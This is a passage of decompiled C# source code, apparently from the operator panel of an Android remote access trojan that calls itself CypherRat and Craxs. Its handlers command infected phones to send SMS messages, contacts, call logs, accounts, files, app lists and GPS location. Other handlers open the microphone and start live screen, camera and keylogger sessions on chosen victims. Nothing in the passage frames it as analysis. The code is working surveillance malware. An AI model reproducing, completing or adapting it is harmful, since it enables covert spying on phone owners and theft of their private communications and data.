			name = "Live_Screen_" + text;
			ScreenShoter screenShoter = (ScreenShoter)MyProject.Application.OpenForms[name];
			if (screenShoter != null)
			{
				screenShoter.Done(new object[1] { "Connection lost..." });
				screenShoter.Livepicbox.Image = Resources.disconnected;
			}
			name = "SMS_Manager_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
					form.Close();
				else
				{
					string text3 = form.Text;
					form.Text = array[1] + text3;
				}
			}
			name = "Contacts_Manager_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
					form.Close();
				else
				{
					string text4 = form.Text;
					form.Text = array[1] + text4;
				}
			}
			name = "Camera_Manager_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
					form.Close();
				else
				{
					string text5 = form.Text;
					form.Text = array[1] + text5;
					((CameraManager)form).CAM0.Image = Resources.disconnected;
				}
			}
			try
			{
				name = "File_Manager_File" + CS_0024_003C_003E8__locals0._0024VB_0024Local_uuid;
				form = MyProject.Application.OpenForms[name];
				if (form != null && !form.IsDisposed)
				{
					FileManager fileManager = (FileManager)form;
					string text6 = form.Text;
					form.Text = array[1] + text6;
					foreach (DataGridViewRow item in (IEnumerable)fileManager.DGVDATA.Rows)
					{
						try
						{
							if (Operators.ConditionalCompareObjectEqual(item.Cells[4].Value, "Downloading..", TextCompare: false))
								item.Cells[4].Value = "Wating..";
						}
                        catch (Exception)
                        {
                            //////CraxsAlert.Showinformation("Sorry");;
                        }
                    }
				}
			}
            catch (Exception)
            {
                //////CraxsAlert.Showinformation("Sorry");;
            }
            name = "Microphone_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
					form.Close();
				else
				{
					string text7 = form.Text;
					form.Text = array[1] + text7;
				}
			}
			name = "SM_Hunter_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				string text8 = form.Text;
				form.Text = array[1] + text8;
			}
			name = "Shell_Terminal_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
					form.Close();
				else
				{
					string text9 = form.Text;
					form.Text = array[1] + text9;
				}
			}
			name = "Location_Manager_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
					form.Close();
				else
				{
					string text10 = form.Text;
					form.Text = array[1] + text10;
				}
			}
			name = "Applications_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
					form.Close();
				else
				{
					string text11 = form.Text;
					form.Text = array[1] + text11;
				}
			}
			name = "Account_Manager_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
					form.Close();
				else
				{
					string text12 = form.Text;
					form.Text = array[1] + text12;
				}
			}
			name = "informations_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
					form.Close();
				else
				{
					string text13 = form.Text;
					form.Text = array[1] + text13;
				}
			}
			name = "Keylogger_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
					form.Close();
				else
				{
					string text14 = form.Text;
					form.Text = array[1] + text14;
				}
			}
			name = "Clipboard_Manager_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
				{
					form.Close();
					return;
				}
				string text15 = form.Text;
				form.Text = array[1] + text15;
			}
		}
        catch (Exception)
        {
            //////CraxsAlert.Showinformation("Sorry");;
        }
    }

	private void UsersToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (WU != null)
			return;
		WU = new Win_Users();
		string path = reso.res_Path + "\\Users";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			string[] array = directories;
			foreach (string path2 in array)
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(path2);
				string path3 = directoryInfo.FullName + "\\user.info";
				if (!File.Exists(path3))
					continue;
				try
				{
					string[] array2 = File.ReadAllLines(path3);
					if (array2.Length == 3)
					{
						string text = reso.res_Path + "\\Icons\\FillEllipse\\User.png";
						WU.DGV0.Rows.Add(array2[0], array2[2] + " /ip:" + array2[1], directoryInfo.Name, reso.GetEllImage(0, new object[5] { text, 15, 15, 17, 17 }));
					}
				}
                catch (Exception)
                {
                    //////CraxsAlert.Showinformation("Sorry");;
                }
            }
		}
		WU.DGV0.Columns[3].Width = 48;
		WU.DGV0.Columns[3].DisplayIndex = 0;
		WU.StartPosition = FormStartPosition.Manual;
		WU.Location = Codes.FixSize(this, WU);
		WU.Show();
	}

	private void AngelAndroidForm_FormClosing(object sender, FormClosingEventArgs e)
	{
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		base.WindowState = FormWindowState.Minimized;
	}

	private void Panel1_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}



	private void Label2_MouseDown(object sender, MouseEventArgs e)
	{
		mov = true;
		Min = Control.MousePosition.Y;
		Mx = Control.MousePosition.X;
		Sw = base.Width;
		Sh = base.Height;
	}

	private void Label2_MouseMove(object sender, MouseEventArgs e)
	{
		if (mov)
			base.Height = checked(Control.MousePosition.Y - Min + Sh);
	}

	private void Label2_MouseUp(object sender, MouseEventArgs e)
	{
		mov = false;
	}

	private void DrakeUIAvatar2_Click(object sender, EventArgs e)
	{
        if (!Versioned.IsNumeric(porttext.Text))
        {
            CraxsAlert.ShowWarning("Only Enter Number : 4444");
            return;
        }
        if (DGVSERVS.Rows.Count > 0)
        {
            foreach (DataGridViewRow item in (IEnumerable)DGVSERVS.Rows)
            {
                if (item.Tag != null && Operators.CompareString(item.Tag.ToString(), porttext.Text, TextCompare: false) == 0)
                {
                    CraxsAlert.Showinformation("this port already added");
                    return;
                }
            }
        }
        if ((Conversions.ToInteger(porttext.Text) < 1000) | (Conversions.ToInteger(porttext.Text) > 49151))
        {
            CraxsAlert.Showinformation("Please Select port between 1000 - 49151");
            return;
        }
        int index = DGVSERVS.Rows.Add(Resources.swtchoff, porttext.Text, "OFF", passtxt.Text );
        DGVSERVS.Rows[index].Cells[2].Style.ForeColor = System.Drawing.Color.Red;
        DGVSERVS.Rows[index].Cells[0].Tag = "OFF";
        DGVSERVS.Rows[index].Tag = porttext.Text;
        porttext.Text = "";
    }

	private void DrakeUIAvatar3_Click(object sender, EventArgs e)
	{
		if (DataLog.Rows.Count > 0)
			DataLog.Rows.Clear();
	}

	
	private void DrakeUIAvatar8_Click(object sender, EventArgs e)
	{
        guna2Panel1.BringToFront();
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
				bigtitletext.Text = "Dashboard";
			else
				bigtitletext.Text = "主面板";
		}
		else
			bigtitletext.Text = "لوحة رئيسية";
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}
        catch (Exception)
        {
            //////CraxsAlert.Showinformation("Sorry");;
        }
    }

	
	private void CypherRat_Deactivate(object sender, EventArgs e)
	{
		try
		{
			isactive = false;
			base.ActiveControl = ClientsWindow;
		}
        catch (Exception)
        {
            //////CraxsAlert.Showinformation("Sorry");;
        }
    }

	private void Panel3_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}
		catch (Exception)
		{
            ////ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	public void updaterows(object[] objs)
	{
		if (base.InvokeRequired)
		{
			updateuiD method = updaterows;
			Invoke(method, new object[1] { objs });
			return;
		}
		try
		{
			Client client = (Client)objs[0];
			DataGridViewRow dataGridViewRow = (DataGridViewRow)objs[1];
			try
			{
				if (dataGridViewRow == null)
					return;
				if ((client.Statistics == null) | (Operators.CompareString(client.Statistics, "null", TextCompare: false) == 0))
					dataGridViewRow.Cells[15].Value = "Bing...";
				else
					dataGridViewRow.Cells[15].Value = client.Statistics;
			}
			catch (Exception)
			{
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
            dataGridViewRow.Cells[12].Value = client.ActiveNow;
			dataGridViewRow.Cells[1].Value = client.Wallpaper;
			dataGridViewRow.Cells[0].Value = reso.GetScreen(client.Screen);
			dataGridViewRow.Cells[10].Value = reso.GetBattery(client.Battery);
			dataGridViewRow.Cells[11].Value = client.Wifi;
			if (client.isnewcall)
				dataGridViewRow.Cells[9].Value = Resources.new_call;
			if (client.isnewnotifi)
				dataGridViewRow.Cells[8].Value = Resources.new_notifi;
			if (client.IsAdminActive)
				dataGridViewRow.Cells[14].Value = reso.CheckAdmin(client.IsAdminActive);
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void CypherRat_Activated(object sender, EventArgs e)
	{
		try
		{
			isactive = true;
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	

	private void Filebtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Cells[8].Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							object[] parametersObjects = new object[4]
							{
								client.myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA + "get0",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void Smsbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Cells[8].Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".sms" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getSMS + Data.SPL_SOCKET + "sms" + Data.SPL_DATA + "content://sms/",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void Contactbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Cells[8].Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".contacts" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getContacts + Data.SPL_SOCKET + "contacts",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void Applicationsbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						TcpClient myClient = client.myClient;
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".apps" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.Apps + Data.SPL_SOCKET + "apps",
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void Accountbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Cells[8].Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.Account + Data.SPL_SOCKET + "account",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void Callsbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Cells[8].Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".calls" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getCalls + Data.SPL_SOCKET + "calls",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void Screenbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Cells[8].Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Live_Screen_" + client.ClientRemoteAddress;
						ScreenShoter screenShoter = (ScreenShoter)MyProject.Application.OpenForms[name];
						if (screenShoter == null)
						{
							screenShoter = new ScreenShoter();
							screenShoter.Name = name;
							screenShoter.Title = string.Format("{0} - IP:{1}", "Live Screen", client.ClientAddressIP);
							screenShoter.Tag = client.ClientRemoteAddress;
							screenShoter.classClient = client;
							screenShoter.Client = client.myClient;
							screenShoter.DownloadsFolder = client.FolderUSER;
							screenShoter.Show();
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void Screenreadbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "SC_Readv2_" + client.ClientAddressIP;
						ScreenReaderV2 screenReaderV = (ScreenReaderV2)MyProject.Application.OpenForms[name];
						if (screenReaderV == null)
						{
							screenReaderV = new ScreenReaderV2();
							screenReaderV.Name = name;
							screenReaderV.Title = string.Format("{0} - IP:{1}", "Screen Reader V2", client.ClientAddressIP);
							screenReaderV.Tag = client.ClientRemoteAddress;
							screenReaderV.classClient = client;
							screenReaderV.Client = client.myClient;
							screenReaderV.DownloadsFolder = client.FolderUSER;
							screenReaderV.Show();
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void Camerabtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client == null)
						continue;
					TcpClient myClient = client.myClient;
					string[] array = client.Keys.Split(':');
					int num = 0;
					int num2 = 0;
					if (client.Isv4)
					{
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lcm<*>" + client.ClientRemoteAddress + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
					else
					{
						string name = "Camera_Manager_" + client.ClientRemoteAddress;
						CameraManager cameraManager = (CameraManager)MyProject.Application.OpenForms[name];
						if (cameraManager != null)
							break;
						cameraManager = new CameraManager();
						cameraManager.Name = name;
						cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", client.ClientAddressIP);
						cameraManager.classClient = client;
						if (cameraManager.classClient != null)
						{
							reso.Directory_Exist(cameraManager.classClient);
							cameraManager.tmpFolderUSER = cameraManager.classClient.FolderUSER;
						}
						cameraManager.Client = client.myClient;
						cameraManager.classCamera = client;
						cameraManager.TempImage = new PictureBox();
						cameraManager.combotext.Visible = false;
						cameraManager.combosizes.Visible = false;
						cameraManager.Show();
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void Micbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Cells[8].Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client == null)
						continue;
					TcpClient myClient = client.myClient;
					string name = "Microphone_" + client.ClientRemoteAddress;
					/*Microphone microphone = (Microphone)MyProject.Application.OpenForms[name];
					if (microphone == null)*/
					{
						string[] array = client.Keys.Split(':');
						if (array.Length < infoServer.KeySize)
							break;
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".microphone" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "start" + Data.SPL_DATA + array[0] + Data.SPL_DATA + array[1] + Data.SPL_DATA + "8000" + Data.SPL_DATA + SecurityKey.MicwaveOutByte + Data.SPL_DATA + client.ClientRemoteAddress + Data.SPL_DATA + "0",
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void Keyloggerbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						string name = "Keylogger_" + client.ClientRemoteAddress;
						Keylogger keylogger = (Keylogger)MyProject.Application.OpenForms[name];
						if (client != null && keylogger == null)
						{
							keylogger = new Keylogger();
							keylogger.Name = name;
							keylogger.Title = string.Format("{0} - IP:{1}", "Keylogger", client.ClientAddressIP);
							keylogger.Client = client.myClient;
							keylogger.classClient = client;
							keylogger.DGV0.Columns[3].Width = 48;
							keylogger.DGV0.Columns[3].DisplayIndex = 0;
							keylogger.tmpAddressIP = client.ClientAddressIP;
							keylogger.tmpClientName = client.ClientName;
							keylogger.tmpCountry = client.Country;
							keylogger.tmpFolderUSER = client.FolderUSER;
							client.Keylogg = true;
							keylogger.Show();
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void Locationbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Cells[8].Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient3 + Data.SPL_SOCKET + Data.SPL_DATA + Data.SPL_SOCKET + SecurityKey.getGPS,
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void Searchbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count < 1)
		{
			CraxsAlert.Showinformation("No Clients Found");
			return;
		}
		if (string.IsNullOrEmpty(searchtext.Text))
		{
			CraxsAlert.Showinformation("Enter Text First");
			return;
		}
		checked
		{
			int num = ClientsWindow.Rows.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					Client client = (Client)ClientsWindow.Rows[i].Cells[8].Tag;
					if (searchbefore.Contains(client.Row) || !(client.ClientName.ToLower().Contains(searchtext.Text.ToLower()) | client.ClientAddressIP.ToLower().Contains(searchtext.Text.ToLower()) | client.Country.ToLower().Contains(searchtext.Text.ToLower()) | client.android.ToLower().Contains(searchtext.Text.ToLower()) | client.ClientName.ToLower().Contains(searchtext.Text.ToLower()) | client.ActiveNow.ToLower().Contains(searchtext.Text.ToLower())))
						continue;
					ClientsWindow.FirstDisplayedScrollingRowIndex = client.Row.Index;
					searchbefore.Add(client.Row);
					break;
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
	}

	private void B_ok_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count > 0)
			ClientsWindow.SelectedRows[0].Selected = false;
	}

	private void TCbattertpic_MouseEnter(object sender, EventArgs e)
	{
	}

	private void DrakeUIButtonIcon8_Click(object sender, EventArgs e)
	{
		try
		{
			if (ClientsWindow.Rows.Count > 0)
				ClientsWindow.FirstDisplayedScrollingRowIndex = 0;
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void Clientfoldrbtn_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
			{
				string folderUSER = ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag).FolderUSER;
				if (!Directory.Exists(folderUSER))
					Directory.CreateDirectory(folderUSER);
				Process.Start(folderUSER);
			}
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void DrakeUIButtonIcon11_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
			{
				((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag).Blockme(((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag).ClientAddressIP);
				((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag).Close(((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag).myClient);
			}
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void DrakeUIButtonIcon10_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
			{
				TcpClient myClient = ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag).myClient;
				object[] parametersObjects = new object[4]
				{
					myClient,
					SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.Information + Data.SPL_SOCKET + "information",
					Codes.Encoding().GetBytes("null"),
					(Client)ClientsWindow.SelectedRows[0].Cells[8].Tag
				};
				((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag).SendMessage(parametersObjects);
			}
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void DrakeUIButtonIcon9_Click(object sender, EventArgs e)
	{
		try
		{
			if (ClientsWindow.Rows.Count > 0)
				ClientsWindow.FirstDisplayedScrollingRowIndex = ClientsWindow.Rows[checked(ClientsWindow.Rows.Count - 1)].Index;
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void Searchtext_TextChanged(object sender, EventArgs e)
	{
		searchbefore.Clear();
		if (!string.IsNullOrEmpty(searchtext.Text))
			clearsrchbtn.Visible = true;
		else
			clearsrchbtn.Visible = false;
	}

	private void DrakeUIButtonIcon13_Click(object sender, EventArgs e)
	{
		base.WindowState = FormWindowState.Minimized;
	}

	private void DrakeUIButtonIcon12_Click(object sender, EventArgs e)
	{
		smoothfadedout(this, 40);
	}

	[AsyncStateMachine(typeof(VB_0024StateMachine_108_smoothfadedout))]
	[DebuggerStepThrough]
	private void smoothfadedout(Form targetform, int slowtime)
	{
		VB_0024StateMachine_108_smoothfadedout stateMachine = new VB_0024StateMachine_108_smoothfadedout();
		stateMachine._0024VB_0024Me = this;
		stateMachine._0024VB_0024Local_targetform = targetform;
		stateMachine._0024VB_0024Local_slowtime = slowtime;
		stateMachine._0024State = -1;
		stateMachine._0024Builder = AsyncVoidMethodBuilder.Create();
		stateMachine._0024Builder.Start(ref stateMachine);
	}

	private void BlockClientToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGVblocked.Rows.Count <= 0 || DGVblocked.SelectedRows.Count <= 0)
			return;
		DataGridViewRow dataGridViewRow = DGVblocked.SelectedRows[0];
		if (dataGridViewRow == null)
			return;
		checked
		{
			int num = server.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					if (server[i].Blocklist.Contains(dataGridViewRow.Cells[1].Value.ToString()))
					{
						server[i].Blocklist.Remove(dataGridViewRow.Cells[1].Value.ToString());
						Data.MainForm.DGVblocked.Rows.Remove(dataGridViewRow);
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
